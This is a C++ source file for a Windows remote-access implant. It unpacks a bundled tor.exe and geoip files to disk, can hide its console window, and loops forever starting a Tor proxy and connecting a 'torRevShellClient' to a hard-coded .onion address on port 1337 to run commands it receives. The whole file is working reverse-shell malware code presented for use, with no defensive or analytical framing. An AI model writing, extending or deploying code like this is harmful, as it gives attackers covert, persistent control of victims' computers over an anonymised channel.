#include "clientClass.h"
#include "torExeRes.h"

#include <Windows.h>
#include <lmcons.h>
#include <string>
#include <fstream>

HMODULE GetCurrentModule() {
    HMODULE hModule = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCTSTR)GetCurrentModule, &hModule);
    return hModule;
}

void writeResToDisk(std::string path, int r, int t){
    HMODULE hCurrentModule = GetCurrentModule();
    HRSRC hRes = FindResource(hCurrentModule, MAKEINTRESOURCE(r), MAKEINTRESOURCE(t));
    HGLOBAL hData = LoadResource(hCurrentModule, hRes);
    DWORD hDataSize = SizeofResource(hCurrentModule, hRes);
    char* hDataCharP = (char*)LockResource(hData);
    // Write to disk at path
    std::ofstream f(path, std::ios::binary);
    f.write(hDataCharP, hDataSize);
    f.close();
}

#define torExePath ".\\taw.exe" // taw pwoxy uwu

/*
    Drops tor.exe along with geoip data
*/
void dropTor() {
    writeResToDisk(torExePath, TOREXE, EXEFILE);
    CreateDirectory(L".\\data", NULL);
    writeResToDisk("data\\geoip", GEOIP, TEXTFILE);
    writeResToDisk("data\\geoip6", GEOIP6, TEXTFILE);
}

#define HOST "lj3dtor6aftsz6koehgz7j7wroel6hrtcmiw4y7x2vkasjnoz2w5e3qd.onion"
#define showConsole true

int main() {
    ShowWindow(GetConsoleWindow(), (showConsole) ? SW_SHOW : SW_HIDE);


    // Put TOR onto the disk if it isnt there already
    if (GetFileAttributes((LPCWSTR)torExePath) == INVALID_FILE_ATTRIBUTES || GetFileAttributes(L"data\\geoip") == INVALID_FILE_ATTRIBUTES){
        dropTor();
    }
    
    // Convert the relative path of the tor EXE to an absolute one - prevents issues restarting the proxy
    char fullTorExePath[MAX_PATH] = { 0 };
    _fullpath(fullTorExePath, torExePath, _MAX_PATH);
    
    // Hell loop of forever restarting TOR and trying to connect to the server :)
    // I could make it not restart TOR every time, but I had a few problems with that before
    while (1) {
        torRevShellClient c(fullTorExePath, HOST, 1337);
        c.startProxy();
        c.attemptConnect();
        c.cmdProcessLoop(); // If attemptConnect() fails, this function will return immediately
    }

    return 0;
}